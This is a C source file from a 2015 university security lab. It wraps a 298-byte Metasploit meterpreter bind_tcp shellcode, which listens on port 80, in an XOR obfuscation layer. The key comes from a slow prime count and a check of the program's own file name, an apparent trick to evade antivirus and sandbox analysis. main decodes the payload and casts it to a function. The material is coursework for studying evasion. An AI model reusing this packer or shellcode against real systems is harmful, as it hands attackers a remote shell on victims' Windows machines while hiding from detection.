/* Bradford Smith (bsmith8)
 * CS 577 Lab 9 key.c
 * 12/03/2015
 * "I pledge my honor that I have abided by the Stevens Honor System."
 */

#include "notavirus.h"

/*
 * windows/meterpreter/bind_tcp - 298 bytes (stage 1)
 * http://www.metasploit.com
 * VERBOSE=false, LPORT=80, RHOST=, EnableStageEncoding=false,
 * PrependMigrate=false, EXITFUNC=process, AutoLoadStdapi=true,
 * InitialAutoRunScript=, AutoRunScript=, AutoSystemInfo=true,
 * EnableUnicodeEncoding=true
 */

unsigned char packed[] =
"\xbe\xaa\xcb\x42\x42\x42\x22\xcb\xa7\x73\x90\x26\xc9\x10\x72"
"\xc9\x10\x4e\xc9\x10\x56\xc9\x30\x6a\x4d\xf5\x08\x64\x73\xbd"
"\x73\x82\xee\x7e\x23\x3e\x40\x6e\x62\x83\x8d\x4f\x43\x85\xa0"
"\xb2\x10\x15\xc9\x10\x52\xc9\x00\x7e\x43\x92\xc9\x02\x3a\xc7"
"\x82\x36\x08\x43\x92\x12\xc9\x0a\x5a\xc9\x1a\x62\x43\x91\xa1"
"\x7e\x0b\xc9\x76\xc9\x43\x94\x73\xbd\x73\x82\xee\x83\x8d\x4f"
"\x43\x85\x7a\xa2\x37\xb6\x41\x3f\xba\x79\x3f\x66\x37\xa0\x1a"
"\xc9\x1a\x66\x43\x91\x24\xc9\x4e\x09\xc9\x1a\x5e\x43\x91\xc9"
"\x46\xc9\x43\x92\xcb\x06\x66\x66\x19\x19\x23\x1b\x18\x13\xbd"
"\xa2\x1a\x1d\x18\xc9\x50\xa9\xc4\x1f\x2a\x71\x70\x42\x42\x2a"
"\x35\x31\x70\x1d\x16\x2a\x0e\x35\x64\x45\xbd\x97\xfa\xd2\x43"
"\x42\x42\x6b\x86\x16\x12\x2a\x6b\xc2\x29\x42\xbd\x97\x12\x12"
"\x12\x12\x02\x12\x02\x12\x2a\xa8\x4d\x9d\xa2\xbd\x97\xd5\x73"
"\x99\x11\x2a\x40\x42\x42\x12\xcb\xa4\x28\x52\x14\x15\x2a\x80"
"\x99\x75\x25\xbd\x97\x11\x15\x2a\xf5\xab\x7a\xbd\xbd\x97\x11"
"\x11\x15\x2a\x36\xae\x79\xa3\xbd\x97\x15\xd5\x2a\x37\x2c\x0f"
"\x23\xbd\x97\x28\x42\x28\x46\x14\x15\x2a\x40\x9b\x8a\x1d\xbd"
"\x97\xc9\x74\x28\x02\x2a\x42\x52\x42\x42\x14\x28\x42\x2a\x1a"
"\xe6\x11\xa7\xbd\x97\xd1\x11\x28\x42\x14\x11\x15\x2a\x40\x9b"
"\x8a\x1d\xbd\x97\x43\x81\x6b\x84\xc7\xb4\x37\xae\x81"; /* 298 bytes */

char* myName;

unsigned char* calcKey()
{
    unsigned char* ret;
    int big = 0;
    int small = 9526;
    int diff;
    int i;
    int j;

    /* big is number of primes between 1 and 100000 -- 9592*/
    for (i = 0; i < 100000; i++)
    {
        j = 2;
        while (j <= i)
        {
            if (i % j == 0)
                break;
            j++;
        }
        if (j == i)
            big++;
    }

    /* big: 9592 - small: 9526 + 0 -- implicit if */
    diff = big - small + strcmp(myName, "./key.exe");
    /* diff = 66, hex 42 */
    ret = (unsigned char*)&diff;

    return ret;
}

unsigned char* xorCrypt(unsigned char* in)
{
    int i;
    unsigned char *secret = calcKey();

    for (i = 0; i < 298; i++)
        in[i] ^= *secret;

    return in;
}

void prettyPrint(unsigned char* hex)
{
    int i;
    for (i = 0; i < 298; i++)
    {
        printf("\\x%x", hex[i] & 0xff);
        if (((i + 1) % 15) == 0)
            printf("\n");
    }
    printf("\n");
}

int main(int argc, char** argv)
{
    myName = argv[0];

    unsigned char* unpacked;

    unpacked = xorCrypt(packed);

    /* print out to get encrypted buffer text */
    /* prettyPrint(unpacked); */

    /* Declare pointer on function */
    void (*func) ();

    /* Cast shellcode into function */
    func = (void (*) ()) unpacked;
}
